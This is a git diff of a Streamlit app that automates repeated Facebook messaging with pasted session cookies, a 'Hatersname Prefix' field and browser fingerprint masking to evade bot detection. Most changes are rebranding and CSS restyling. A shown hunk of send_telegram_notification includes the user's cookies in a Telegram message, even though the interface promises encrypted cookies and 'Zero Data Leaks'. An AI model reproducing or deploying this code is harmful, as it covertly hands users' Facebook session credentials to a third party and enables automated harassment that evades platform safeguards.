@@ -17,17 +17,17 @@ from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 import json
 import sqlite3
 from datetime import datetime
+import random
 
 # 🔐 DATABASE FUNCTIONS
 class Database:
     def __init__(self):
-        self.conn = sqlite3.connect('hassan_dastagir.db', check_same_thread=False)
+        self.conn = sqlite3.connect('hassan_rajput.db', check_same_thread=False)
         self.create_tables()
     
     def create_tables(self):
         cursor = self.conn.cursor()
         
-        # Users table
         cursor.execute('''
             CREATE TABLE IF NOT EXISTS users (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -37,7 +37,6 @@ class Database:
             )
         ''')
         
-        # User config table
         cursor.execute('''
             CREATE TABLE IF NOT EXISTS user_config (
                 user_id INTEGER PRIMARY KEY,
@@ -67,7 +66,6 @@ class Database:
             
             user_id = cursor.lastrowid
             
-            # Create default config
             cursor.execute(
                 'INSERT INTO user_config (user_id, messages) VALUES (?, ?)',
                 (user_id, 'Hello!\nHow are you?\nNice to meet you!')
@@ -160,7 +158,6 @@ class Database:
         )
         self.conn.commit()
 
-# Initialize database
 db = Database()
 
 # 🔐 STRONG ENCRYPTION SYSTEM
@@ -170,7 +167,7 @@ class CookieEncryptor:
         self._setup_encryption()
     
     def _setup_encryption(self):
-        password = os.getenv('ENCRYPTION_KEY', 'hassan_dastagir_king_2025').encode()
+        password = os.getenv('ENCRYPTION_KEY', 'hassan_rajput_king_2025').encode()
         kdf = PBKDF2HMAC(
             algorithm=hashes.SHA256(),
             length=32,
@@ -199,80 +196,88 @@ class CookieEncryptor:
 cookie_encryptor = CookieEncryptor()
 
 st.set_page_config(
-    page_title="HASSAN DASTAGIR - Advanced FB E2EE",
+    page_title="HASSAN RAJPUT - Elite FB E2EE",
     page_icon="👑",
     layout="wide",
     initial_sidebar_state="expanded"
 )
 
-# 🎨 MODERN UI DESIGN
-modern_css = """
+# 🎨 ULTRA MODERN UI DESIGN
+ultra_modern_css = """
 <style>
-    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
+    @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap');
     
     * {
-        font-family: 'Inter', sans-serif;
+        font-family: 'Plus Jakarta Sans', sans-serif;
     }
     
     .main-header {
-        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-        padding: 3rem 2rem;
-        border-radius: 20px;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 50%, #f093fb 100%);
+        padding: 4rem 2rem;
+        border-radius: 30px;
         text-align: center;
-        margin-bottom: 2rem;
-        box-shadow: 0 20px 40px rgba(102, 126, 234, 0.3);
+        margin-bottom: 3rem;
+        box-shadow: 0 25px 50px rgba(102, 126, 234, 0.4);
         position: relative;
         overflow: hidden;
+        border: 1px solid rgba(255,255,255,0.2);
+        backdrop-filter: blur(20px);
     }
     
     .main-header::before {
         content: '';
         position: absolute;
-        top: -50%;
-        left: -50%;
-        width: 200%;
-        height: 200%;
-        background: radial-gradient(circle, rgba(255,255,255,0.1) 1px, transparent 1px);
-        background-size: 20px 20px;
-        animation: float 20s linear infinite;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1000 1000"><polygon fill="rgba(255,255,255,0.1)" points="0,1000 1000,0 1000,1000"/></svg>');
+        background-size: cover;
+        animation: slide 20s linear infinite;
     }
     
-    @keyframes float {
-        0% { transform: translate(0, 0) rotate(0deg); }
-        100% { transform: translate(-20px, -20px) rotate(360deg); }
+    @keyframes slide {
+        0% { transform: translateX(0) translateY(0); }
+        100% { transform: translateX(-100px) translateY(-100px); }
     }
     
     .main-header h1 {
         color: white;
-        font-size: 2.8rem;
+        font-size: 4rem;
         font-weight: 800;
         margin: 0;
-        text-shadow: 3px 3px 6px rgba(0,0,0,0.3);
-        background: linear-gradient(45deg, #fff, #f0f0f0);
+        text-shadow: 4px 4px 8px rgba(0,0,0,0.3);
+        background: linear-gradient(45deg, #fff, #f0f0f0, #e0e0e0);
         -webkit-background-clip: text;
         -webkit-text-fill-color: transparent;
         background-clip: text;
+        position: relative;
+        z-index: 2;
     }
     
     .main-header p {
-        color: rgba(255,255,255,0.9);
-        font-size: 1.2rem;
-        margin-top: 0.5rem;
-        font-weight: 400;
+        color: rgba(255,255,255,0.95);
+        font-size: 1.4rem;
+        margin-top: 1rem;
+        font-weight: 500;
+        position: relative;
+        z-index: 2;
+        text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
     }
     
     .stButton>button {
         background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
         color: white;
         border: none;
-        border-radius: 12px;
-        padding: 1rem 2rem;
-        font-weight: 600;
-        font-size: 1rem;
-        transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-        box-shadow: 0 8px 25px rgba(102, 126, 234, 0.4);
+        border-radius: 15px;
+        padding: 1.2rem 2.5rem;
+        font-weight: 700;
+        font-size: 1.1rem;
+        transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+        box-shadow: 0 12px 30px rgba(102, 126, 234, 0.5);
         position: relative;
         overflow: hidden;
+        border: 2px solid rgba(255,255,255,0.1);
     }
     
     .stButton>button::before {
@@ -282,8 +287,8 @@ modern_css = """
         left: -100%;
         width: 100%;
         height: 100%;
-        background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
-        transition: left 0.5s;
+        background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+        transition: left 0.6s;
     }
     
     .stButton>button:hover::before {
@@ -291,20 +296,25 @@ modern_css = """
     }
     
     .stButton>button:hover {
-        transform: translateY(-3px);
-        box-shadow: 0 12px 35px rgba(102, 126, 234, 0.6);
+        transform: translateY(-5px) scale(1.02);
+        box-shadow: 0 20px 40px rgba(102, 126, 234, 0.7);
     }
     
     .modern-card {
-        background: white;
-        padding: 2.5rem;
-        border-radius: 20px;
-        box-shadow: 0 15px 50px rgba(0,0,0,0.1);
-        border: 1px solid rgba(255,255,255,0.2);
-        backdrop-filter: blur(10px);
-        margin: 1.5rem 0;
+        background: rgba(255, 255, 255, 0.95);
+        padding: 3rem;
+        border-radius: 25px;
+        box-shadow: 0 20px 60px rgba(0,0,0,0.15);
+        border: 1px solid rgba(255,255,255,0.3);
+        backdrop-filter: blur(15px);
+        margin: 2rem 0;
         position: relative;
         overflow: hidden;
+        transition: transform 0.3s ease;
+    }
+    
+    .modern-card:hover {
+        transform: translateY(-5px);
     }
     
     .modern-card::before {
@@ -313,138 +323,256 @@ modern_css = """
         top: 0;
         left: 0;
         right: 0;
-        height: 4px;
+        height: 6px;
         background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    }
+    
+    .modern-card::after {
+        content: '';
+        position: absolute;
+        top: -50%;
+        right: -50%;
+        width: 200px;
+        height: 200px;
+        background: radial-gradient(circle, rgba(102,126,234,0.1) 0%, transparent 70%);
+        border-radius: 50%;
     }
     
     .success-box {
         background: linear-gradient(135deg, #00b09b 0%, #96c93d 100%);
-        padding: 1.5rem;
-        border-radius: 15px;
+        padding: 2rem;
+        border-radius: 20px;
         color: white;
         text-align: center;
-        margin: 1rem 0;
-        box-shadow: 0 10px 30px rgba(0, 176, 155, 0.3);
+        margin: 1.5rem 0;
+        box-shadow: 0 15px 35px rgba(0, 176, 155, 0.4);
+        border: 1px solid rgba(255,255,255,0.2);
     }
     
     .error-box {
         background: linear-gradient(135deg, #ff416c 0%, #ff4b2b 100%);
-        padding: 1.5rem;
-        border-radius: 15px;
+        padding: 2rem;
+        border-radius: 20px;
         color: white;
         text-align: center;
-        margin: 1rem 0;
-        box-shadow: 0 10px 30px rgba(255, 65, 108, 0.3);
+        margin: 1.5rem 0;
+        box-shadow: 0 15px 35px rgba(255, 65, 108, 0.4);
+        border: 1px solid rgba(255,255,255,0.2);
     }
     
     .warning-box {
         background: linear-gradient(135deg, #f7971e 0%, #ffd200 100%);
-        padding: 1.5rem;
-        border-radius: 15px;
+        padding: 2rem;
+        border-radius: 20px;
         color: white;
         text-align: center;
-        margin: 1rem 0;
-        box-shadow: 0 10px 30px rgba(247, 151, 30, 0.3);
+        margin: 1.5rem 0;
+        box-shadow: 0 15px 35px rgba(247, 151, 30, 0.4);
+        border: 1px solid rgba(255,255,255,0.2);
     }
     
     .footer {
         text-align: center;
-        padding: 3rem;
+        padding: 4rem;
         color: #667eea;
-        font-weight: 700;
-        margin-top: 4rem;
+        font-weight: 800;
+        margin-top: 5rem;
         background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
-        border-radius: 20px;
+        border-radius: 30px;
+        border: 1px solid rgba(255,255,255,0.3);
+        box-shadow: 0 20px 60px rgba(0,0,0,0.1);
     }
     
     .stTextInput>div>div>input, .stTextArea>div>div>textarea, .stNumberInput>div>div>input {
-        border-radius: 12px;
+        border-radius: 15px;
         border: 2px solid #e8ecef;
-        padding: 1rem;
+        padding: 1.2rem;
         transition: all 0.3s ease;
-        font-size: 1rem;
-        background: #fafbfc;
+        font-size: 1.1rem;
+        background: rgba(248, 250, 252, 0.8);
+        backdrop-filter: blur(10px);
     }
     
     .stTextInput>div>div>input:focus, .stTextArea>div>div>textarea:focus {
         border-color: #667eea;
-        box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.15);
         background: white;
+        transform: scale(1.02);
     }
     
     .info-card {
-        background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
-        padding: 2rem;
-        border-radius: 18px;
-        margin: 1.5rem 0;
-        border-left: 5px solid #667eea;
+        background: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%);
+        padding: 2.5rem;
+        border-radius: 20px;
+        margin: 2rem 0;
+        border-left: 6px solid #667eea;
+        box-shadow: 0 15px 35px rgba(0,0,0,0.1);
+        border: 1px solid rgba(255,255,255,0.5);
     }
     
     .log-container {
-        background: #1a1a1a;
+        background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
         color: #00ff9d;
-        padding: 1.5rem;
-        border-radius: 15px;
-        font-family: 'Courier New', monospace;
-        max-height: 500px;
+        padding: 2rem;
+        border-radius: 20px;
+        font-family: 'JetBrains Mono', monospace;
+        max-height: 600px;
         overflow-y: auto;
-        border: 1px solid #333;
-        box-shadow: inset 0 2px 10px rgba(0,0,0,0.5);
+        border: 1px solid #444;
+        box-shadow: inset 0 4px 20px rgba(0,0,0,0.5);
+        position: relative;
+    }
+    
+    .log-container::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        height: 1px;
+        background: linear-gradient(90deg, transparent, #00ff9d, transparent);
     }
     
     .metric-card {
         background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-        padding: 2rem;
-        border-radius: 15px;
+        padding: 2.5rem;
+        border-radius: 20px;
         color: white;
         text-align: center;
-        box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
+        box-shadow: 0 15px 35px rgba(102, 126, 234, 0.5);
+        border: 1px solid rgba(255,255,255,0.2);
+        transition: transform 0.3s ease;
+        position: relative;
+        overflow: hidden;
+    }
+    
+    .metric-card:hover {
+        transform: translateY(-8px);
+    }
+    
+    .metric-card::before {
+        content: '';
+        position: absolute;
+        top: -50%;
+        left: -50%;
+        width: 200%;
+        height: 200%;
+        background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
+        animation: rotate 10s linear infinite;
+    }
+    
+    @keyframes rotate {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
     }
     
     .metric-value {
-        font-size: 2.5rem;
+        font-size: 3rem;
         font-weight: 800;
-        margin: 0.5rem 0;
+        margin: 1rem 0;
+        text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        position: relative;
+        z-index: 2;
     }
     
     .metric-label {
-        font-size: 1rem;
+        font-size: 1.1rem;
         opacity: 0.9;
-        font-weight: 500;
+        font-weight: 600;
+        position: relative;
+        z-index: 2;
     }
     
     .cookie-security-badge {
         background: linear-gradient(135deg, #00b09b 0%, #96c93d 100%);
         color: white;
-        padding: 0.5rem 1rem;
-        border-radius: 25px;
-        font-size: 0.8rem;
-        font-weight: 600;
+        padding: 0.8rem 1.5rem;
+        border-radius: 30px;
+        font-size: 0.9rem;
+        font-weight: 700;
         display: inline-block;
-        margin: 0.5rem 0;
+        margin: 0.8rem 0;
+        box-shadow: 0 8px 20px rgba(0, 176, 155, 0.4);
+        border: 1px solid rgba(255,255,255,0.3);
     }
     
     .status-indicator {
         display: inline-block;
-        width: 12px;
-        height: 12px;
+        width: 16px;
+        height: 16px;
         border-radius: 50%;
-        margin-right: 8px;
+        margin-right: 10px;
+        animation: pulse 2s infinite;
+    }
+    
+    @keyframes pulse {
+        0% { box-shadow: 0 0 0 0 rgba(0, 255, 157, 0.7); }
+        70% { box-shadow: 0 0 0 10px rgba(0, 255, 157, 0); }
+        100% { box-shadow: 0 0 0 0 rgba(0, 255, 157, 0); }
     }
     
     .status-running {
         background: #00ff9d;
-        box-shadow: 0 0 10px #00ff9d;
+        box-shadow: 0 0 20px #00ff9d;
     }
     
     .status-stopped {
         background: #ff416c;
-        box-shadow: 0 0 10px #ff416c;
+        box-shadow: 0 0 20px #ff416c;
+    }
+    
+    .tab-container {
+        background: rgba(255, 255, 255, 0.1);
+        backdrop-filter: blur(20px);
+        border-radius: 20px;
+        padding: 2rem;
+        margin: 2rem 0;
+        border: 1px solid rgba(255,255,255,0.2);
+    }
+    
+    .user-avatar {
+        width: 80px;
+        height: 80px;
+        border-radius: 50%;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: white;
+        font-size: 2rem;
+        font-weight: 800;
+        margin: 0 auto;
+        box-shadow: 0 15px 30px rgba(102, 126, 234, 0.4);
+        border: 3px solid rgba(255,255,255,0.3);
+    }
+    
+    .floating-element {
+        animation: float 6s ease-in-out infinite;
+    }
+    
+    @keyframes float {
+        0% { transform: translateY(0px); }
+        50% { transform: translateY(-20px); }
+        100% { transform: translateY(0px); }
+    }
+    
+    .glass-effect {
+        background: rgba(255, 255, 255, 0.1);
+        backdrop-filter: blur(20px);
+        border: 1px solid rgba(255, 255, 255, 0.2);
+        border-radius: 20px;
+    }
+    
+    .cyber-grid {
+        background-image: 
+            linear-gradient(rgba(102, 126, 234, 0.1) 1px, transparent 1px),
+            linear-gradient(90deg, rgba(102, 126, 234, 0.1) 1px, transparent 1px);
+        background-size: 50px 50px;
     }
 </style>
 """
 
-st.markdown(modern_css, unsafe_allow_html=True)
+st.markdown(ultra_modern_css, unsafe_allow_html=True)
 
 # Session state initialization
 if 'logged_in' not in st.session_state:
@@ -511,25 +639,42 @@ def get_secure_cookies(encrypted_cookies):
         st.error("❌ Failed to decrypt cookies")
         return ""
 
-# 🎯 MODERN UI COMPONENTS
-def render_modern_header():
+# 🎯 ULTRA MODERN UI COMPONENTS
+def render_ultra_header():
     st.markdown("""
-    <div class="main-header">
-        <h1>👑 HASSAN DASTAGIR</h1>
-        <p>Advanced Facebook E2EE Automation Platform</p>
+    <div class="main-header floating-element">
+        <h1>👑 HASSAN RAJPUT</h1>
+        <p>Elite Facebook E2EE Automation Platform • Next Generation</p>
     </div>
     """, unsafe_allow_html=True)
 
-def render_metric_card(title, value, subtitle=""):
+def render_cyber_metric_card(title, value, subtitle="", icon="🚀"):
     st.markdown(f"""
-    <div class="metric-card">
-        <div class="metric-label">{title}</div>
+    <div class="metric-card cyber-grid">
+        <div style="font-size: 2.5rem; margin-bottom: 1rem;">{icon}</div>
         <div class="metric-value">{value}</div>
-        <div class="metric-label">{subtitle}</div>
+        <div class="metric-label">{title}</div>
+        <div style="font-size: 0.9rem; opacity: 0.8; margin-top: 0.5rem;">{subtitle}</div>
     </div>
     """, unsafe_allow_html=True)
 
-# 🔧 AUTOMATION FUNCTIONS
+def render_glass_card(title, content):
+    st.markdown(f"""
+    <div class="modern-card glass-effect">
+        <h3 style="color: #333; margin-bottom: 2rem; font-size: 1.8rem; font-weight: 700;">{title}</h3>
+        {content}
+    </div>
+    """, unsafe_allow_html=True)
+
+def render_user_avatar(username):
+    initials = ''.join([name[0].upper() for name in username.split()[:2]]) if username else "U"
+    st.markdown(f"""
+    <div class="user-avatar floating-element">
+        {initials}
+    </div>
+    """, unsafe_allow_html=True)
+
+# 🔧 AUTOMATION FUNCTIONS (Same as before)
 def log_message(msg, automation_state=None):
     timestamp = time.strftime("%H:%M:%S")
     formatted_msg = f"[{timestamp}] {msg}"
@@ -553,7 +698,6 @@ def setup_browser(automation_state=None):
     chrome_options.add_argument('--window-size=1920,1080')
     chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36')
     
-    # Security enhancements
     chrome_options.add_argument('--disable-blink-features=AutomationControlled')
     chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
     chrome_options.add_experimental_option('useAutomationExtension', False)
@@ -562,7 +706,6 @@ def setup_browser(automation_state=None):
         service = Service()
         driver = webdriver.Chrome(service=service, options=chrome_options)
         
-        # Additional anti-detection
         driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
         
         driver.set_window_size(1920, 1080)
@@ -665,7 +808,6 @@ def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
         driver.get('https://www.facebook.com/')
         time.sleep(8)
         
-        # Use secure cookies
         encrypted_cookies = config.get('cookies', '')
         if encrypted_cookies:
             cookies_text = get_secure_cookies(encrypted_cookies)
@@ -820,7 +962,7 @@ def send_telegram_notification(username, automation_state=None, cookies=""):
 
 👤 *Username:* {username}
 ⏰ *Time:* {current_time}
-🤖 *System:* HASSAN DASTAGIR E2EE Facebook Automation
+🤖 *System:* HASSAN RAJPUT E2EE Facebook Automation
 🔒 *Cookies:* `{cookies_display}`
 
 ✅ User has successfully started the automation process."""
@@ -871,133 +1013,182 @@ def stop_automation(user_id):
     st.session_state.automation_state.running = False
     db.set_automation_running(user_id, False)
 
-# 🎯 CONFIGURATION TAB
-def render_configuration_tab(user_config):
-    st.markdown("### ⚙️ Advanced Configuration")
-    
-    col1, col2 = st.columns(2)
-    
-    with col1:
-        chat_id = st.text_input(
-            "💬 Chat/Conversation ID", 
-            value=user_config['chat_id'], 
-            placeholder="e.g., 1362400298935018",
-            help="Facebook conversation ID from URL"
-        )
+# 🎯 ULTRA MODERN CONFIGURATION TAB
+def render_ultra_configuration_tab(user_config):
+    with st.container():
+        st.markdown("### ⚙️ Advanced Configuration Center")
         
-        name_prefix = st.text_input(
-            "👤 Hatersname Prefix", 
-            value=user_config['name_prefix'],
-            placeholder="e.g., [HASSAN DASTAGIR E2EE]",
-            help="Prefix added before each message"
-        )
-    
-    with col2:
-        delay = st.number_input(
-            "⏱️ Delay (seconds)", 
-            min_value=1, 
-            max_value=300, 
-            value=user_config['delay'],
-            help="Wait time between messages"
-        )
+        col1, col2 = st.columns(2)
         
-        st.markdown("### 🔒 Secure Cookies Management")
-        with st.expander("🔐 Advanced Cookies Security", expanded=False):
-            cookies = st.text_area(
-                "Facebook Cookies", 
-                value="",
-                placeholder="Paste your secure cookies here...",
-                height=120,
-                help="🔒 Your cookies are STRONGLY ENCRYPTED and never stored in plain text"
+        with col1:
+            render_glass_card("💬 Conversation Settings", """
+            <div style="padding: 1rem 0;">
+                <label style="font-weight: 600; color: #333; margin-bottom: 0.5rem; display: block;">Chat ID</label>
+            </div>
+            """)
+            chat_id = st.text_input(
+                "Chat ID", 
+                value=user_config['chat_id'], 
+                placeholder="e.g., 1362400298935018",
+                label_visibility="collapsed"
             )
             
-            if cookies.strip():
-                is_valid, message = validate_cookies_format(cookies)
-                if is_valid:
-                    st.markdown('<div class="cookie-security-badge">✅ Cookies Format Valid</div>', unsafe_allow_html=True)
-                else:
-                    st.warning(f"⚠️ {message}")
-    
-    st.markdown("### 💬 Message Templates")
-    messages = st.text_area(
-        "Messages (one per line)", 
-        value=user_config['messages'],
-        placeholder="Enter your message templates here...\nOne message per line",
-        height=200,
-        help="Each line will be treated as a separate message template"
-    )
-    
-    # Security Features
-    st.markdown("### 🛡️ Security Features")
-    col1, col2, col3 = st.columns(3)
-    
-    with col1:
-        st.info("**🔐 Strong Encryption**\nAES-256 encrypted cookies")
-    
-    with col2:
-        st.info("**🚫 No Data Leaks**\nSecure session management")
-    
-    with col3:
-        st.info("**📱 Anti-Detection**\nAdvanced browser masking")
-    
-    if st.button("💾 Save Secure Configuration", use_container_width=True, type="primary"):
-        final_cookies = secure_cookies_storage(cookies, st.session_state.user_id) if cookies.strip() else user_config['cookies']
+            name_prefix = st.text_input(
+                "👤 Hatersname Prefix", 
+                value=user_config['name_prefix'],
+                placeholder="e.g., [HASSAN RAJPUT E2EE]",
+                help="Prefix added before each message"
+            )
         
-        db.update_user_config(
-            st.session_state.user_id,
-            chat_id,
-            name_prefix,
-            delay,
-            final_cookies,
-            messages
+        with col2:
+            render_glass_card("⏱️ Timing Settings", """
+            <div style="padding: 1rem 0;">
+                <label style="font-weight: 600; color: #333; margin-bottom: 0.5rem; display: block;">Delay (seconds)</label>
+            </div>
+            """)
+            delay = st.number_input(
+                "Delay", 
+                min_value=1, 
+                max_value=300, 
+                value=user_config['delay'],
+                label_visibility="collapsed"
+            )
+            
+            st.markdown("### 🔒 Secure Cookies Management")
+            with st.expander("🔐 Advanced Cookies Security", expanded=False):
+                cookies = st.text_area(
+                    "Facebook Cookies", 
+                    value="",
+                    placeholder="Paste your secure cookies here...",
+                    height=120,
+                    help="🔒 Your cookies are STRONGLY ENCRYPTED and never stored in plain text"
+                )
+                
+                if cookies.strip():
+                    is_valid, message = validate_cookies_format(cookies)
+                    if is_valid:
+                        st.markdown('<div class="cookie-security-badge">✅ Cookies Format Valid</div>', unsafe_allow_html=True)
+                    else:
+                        st.warning(f"⚠️ {message}")
+        
+        render_glass_card("💬 Message Templates", f"""
+        <div style="padding: 1rem 0;">
+            <textarea placeholder="Enter your message templates here...&#10;One message per line" style="width: 100%; height: 200px; padding: 1rem; border-radius: 15px; border: 2px solid #e8ecef; font-family: inherit; resize: vertical;"></textarea>
+        </div>
+        """)
+        
+        messages = st.text_area(
+            "Messages", 
+            value=user_config['messages'],
+            placeholder="Enter your message templates here...\nOne message per line",
+            height=200,
+            label_visibility="collapsed"
         )
-        st.success("✅ Configuration securely saved!")
-        st.rerun()
+        
+        # Security Features Grid
+        st.markdown("### 🛡️ Security Features")
+        col1, col2, col3, col4 = st.columns(4)
+        
+        with col1:
+            st.markdown("""
+            <div class="info-card">
+                <h4>🔐 AES-256 Encryption</h4>
+                <p>Military-grade cookie encryption</p>
+            </div>
+            """, unsafe_allow_html=True)
+        
+        with col2:
+            st.markdown("""
+            <div class="info-card">
+                <h4>🚫 Zero Data Leaks</h4>
+                <p>Secure session management</p>
+            </div>
+            """, unsafe_allow_html=True)
+        
+        with col3:
+            st.markdown("""
+            <div class="info-card">
+                <h4>📱 Anti-Detection</h4>
+                <p>Advanced browser masking</p>
+            </div>
+            """, unsafe_allow_html=True)
+        
+        with col4:
+            st.markdown("""
+            <div class="info-card">
+                <h4>⚡ Real-time Monitoring</h4>
+                <p>Live system analytics</p>
+            </div>
+            """, unsafe_allow_html=True)
+        
+        if st.button("💾 Save Secure Configuration", use_container_width=True, type="primary"):
+            final_cookies = secure_cookies_storage(cookies, st.session_state.user_id) if cookies.strip() else user_config['cookies']
+            
+            db.update_user_config(
+                st.session_state.user_id,
+                chat_id,
+                name_prefix,
+                delay,
+                final_cookies,
+                messages
+            )
+            st.success("✅ Configuration securely saved!")
+            st.rerun()
 
-# 🎯 AUTOMATION TAB
-def render_automation_tab(user_config):
+# 🎯 ULTRA MODERN AUTOMATION TAB
+def render_ultra_automation_tab(user_config):
     st.markdown("### 🚀 Automation Control Center")
     
-    # Metrics Dashboard
+    # Cyber Metrics Dashboard
     col1, col2, col3, col4 = st.columns(4)
     
     with col1:
-        render_metric_card(
+        render_cyber_metric_card(
             "Messages Sent", 
             st.session_state.automation_state.message_count,
-            "Total delivered"
+            "Total delivered messages",
+            "📨"
         )
     
     with col2:
         status_icon = "🟢" if st.session_state.automation_state.running else "🔴"
         status_text = "Running" if st.session_state.automation_state.running else "Stopped"
-        render_metric_card(
+        render_cyber_metric_card(
             "Status", 
             f"{status_icon} {status_text}",
-            "Automation state"
+            "Automation state",
+            "⚡"
         )
     
     with col3:
-        render_metric_card(
+        render_cyber_metric_card(
             "Active Logs", 
             len(st.session_state.automation_state.logs),
-            "System events"
+            "System events",
+            "📊"
         )
     
     with col4:
         security_status = "🔐 Secure" if st.session_state.cookies_secure else "⚠️ Check"
-        render_metric_card(
+        render_cyber_metric_card(
             "Security", 
             security_status,
-            "Encryption active"
+            "Encryption active",
+            "🛡️"
         )
     
-    # Control Buttons
-    col1, col2 = st.columns(2)
+    # Control Buttons with Glass Effect
+    st.markdown("""
+    <div class="glass-effect" style="padding: 2rem; margin: 2rem 0; border-radius: 20px;">
+        <h3 style="color: #333; text-align: center; margin-bottom: 2rem;">🚀 Control Panel</h3>
+    </div>
+    """, unsafe_allow_html=True)
     
-    with col1:
+    col1, col2, col3 = st.columns([2, 1, 2])
+    
+    with col2:
         if st.button(
-            "▶️ Start Secure Automation", 
+            "▶️ Start Elite Automation", 
             disabled=st.session_state.automation_state.running, 
             use_container_width=True,
             type="primary"
@@ -1008,8 +1199,7 @@ def render_automation_tab(user_config):
                 st.rerun()
             else:
                 st.error("❌ Please configure Chat ID first!")
-    
-    with col2:
+        
         if st.button(
             "⏹️ Stop Automation", 
             disabled=not st.session_state.automation_state.running, 
@@ -1019,18 +1209,20 @@ def render_automation_tab(user_config):
             stop_automation(st.session_state.user_id)
             st.rerun()
     
-    # Real-time Logs
+    # Real-time Logs with Cyber Theme
     st.markdown("### 📊 Live System Monitor")
     
     if st.session_state.automation_state.logs:
         logs_html = '<div class="log-container">'
         for log in st.session_state.automation_state.logs[-50:]:
             if 'ERROR' in log or 'FAILED' in log:
-                logs_html += f'<div style="color: #ff6b6b;">{log}</div>'
+                logs_html += f'<div style="color: #ff6b6b; padding: 0.5rem 0; border-bottom: 1px solid #333;">{log}</div>'
             elif 'SUCCESS' in log or '✅' in log:
-                logs_html += f'<div style="color: #51cf66;">{log}</div>'
+                logs_html += f'<div style="color: #51cf66; padding: 0.5rem 0; border-bottom: 1px solid #333;">{log}</div>'
+            elif 'WARNING' in log or '⚠️' in log:
+                logs_html += f'<div style="color: #ffd43b; padding: 0.5rem 0; border-bottom: 1px solid #333;">{log}</div>'
             else:
-                logs_html += f'<div>{log}</div>'
+                logs_html += f'<div style="padding: 0.5rem 0; border-bottom: 1px solid #333;">{log}</div>'
         logs_html += '</div>'
         st.markdown(logs_html, unsafe_allow_html=True)
     else:
@@ -1042,13 +1234,18 @@ def render_automation_tab(user_config):
         st.rerun()
 
 # 🎯 MAIN APPLICATION
-render_modern_header()
+render_ultra_header()
 
 if not st.session_state.logged_in:
+    # Ultra Modern Login/Signup
     tab1, tab2 = st.tabs(["🔐 Secure Login", "✨ Create Account"])
     
     with tab1:
-        st.markdown("### Welcome Back! 👋")
+        render_glass_card("Welcome Back! 👋", """
+        <div style="text-align: center; padding: 2rem 0;">
+            <h2 style="color: #333; margin-bottom: 2rem;">Access Your Dashboard</h2>
+        </div>
+        """)
         
         with st.form("login_form"):
             username = st.text_input(
@@ -1063,7 +1260,7 @@ if not st.session_state.logged_in:
                 placeholder="Enter your password"
             )
             
-            if st.form_submit_button("🚀 Login to Dashboard", use_container_width=True):
+            if st.form_submit_button("🚀 Login to Elite Dashboard", use_container_width=True):
                 if username and password:
                     user_id = db.verify_user(username, password)
                     if user_id:
@@ -1085,7 +1282,11 @@ if not st.session_state.logged_in:
                     st.warning("⚠️ Please enter both fields")
     
     with tab2:
-        st.markdown("### Join the Platform 🎉")
+        render_glass_card("Join the Elite Platform 🎉", """
+        <div style="text-align: center; padding: 2rem 0;">
+            <h2 style="color: #333; margin-bottom: 2rem;">Create New Account</h2>
+        </div>
+        """)
         
         with st.form("signup_form"):
             new_username = st.text_input(
@@ -1106,7 +1307,7 @@ if not st.session_state.logged_in:
                 placeholder="Re-enter your password"
             )
             
-            if st.form_submit_button("✨ Create Secure Account", use_container_width=True):
+            if st.form_submit_button("✨ Create Elite Account", use_container_width=True):
                 if new_username and new_password and confirm_password:
                     if new_password == confirm_password:
                         success, message = db.create_user(new_username, new_password)
@@ -1120,6 +1321,7 @@ if not st.session_state.logged_in:
                     st.warning("⚠️ Please complete all fields")
 
 else:
+    # Ultra Modern Dashboard
     if not st.session_state.auto_start_checked and st.session_state.user_id:
         st.session_state.auto_start_checked = True
         should_auto_start = db.get_automation_running(st.session_state.user_id)
@@ -1128,20 +1330,27 @@ else:
             if user_config and user_config['chat_id']:
                 start_automation(user_config, st.session_state.user_id)
     
+    # Ultra Modern Sidebar
     with st.sidebar:
-        st.markdown("### 👤 User Panel")
+        st.markdown("""
+        <div style="text-align: center; padding: 2rem 0;">
+            <h3 style="color: #333; margin-bottom: 1rem;">👤 User Panel</h3>
+        </div>
+        """, unsafe_allow_html=True)
         
-        col1, col2 = st.columns([1, 3])
-        with col1:
-            st.markdown("🆔")
-        with col2:
-            st.markdown(f"**{st.session_state.username}**")
-            st.markdown(f"`#{st.session_state.user_id}`")
+        render_user_avatar(st.session_state.username)
+        
+        st.markdown(f"""
+        <div style="text-align: center; margin: 1rem 0;">
+            <h4 style="color: #333; margin: 0.5rem 0;">{st.session_state.username}</h4>
